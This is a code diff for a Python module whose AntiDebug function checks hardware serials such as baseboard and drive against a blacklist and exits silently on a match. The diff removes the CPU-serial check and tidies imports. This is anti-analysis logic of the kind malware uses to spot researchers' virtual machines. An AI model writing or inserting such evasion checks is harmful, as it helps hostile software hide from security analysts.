@@ -13,15 +13,14 @@
 from os import _exit, environ, sep, getenv
 from os.path import exists
 from subprocess import check_output, PIPE
-from psutil import cpuinfo, process_iter
+from psutil import process_iter
 from uuid import UUID, getnode
 from wmi import WMI
-from subprocess import check_output
-from requests import DEVNULL, get
+from subprocess import check_output, DEVNULL
+from requests import get
 from platform import system
 from json import loads
 from manager.blacklist import BlackList
-from manager.logger import Log
 
 
 
@@ -70,17 +69,6 @@ def checkBASE():
         return  baseboards[0].SerialNumber
     except:
         return "No data"
-    
-
-
-def checkCPU():
-    try:
-        cpu_info = cpuinfo()
-        return cpu_info[0].serial
-    except:
-        return "No data"
-
-
 
 def checkDrive():
     try:
@@ -187,10 +175,6 @@ def AntiDebug(oneStart):
 
 
     if checkBASE() in BlackList.BaseBoard:
-         _exit(0)
-
-
-    if checkCPU() in BlackList.CPU:
          _exit(0)
 
 
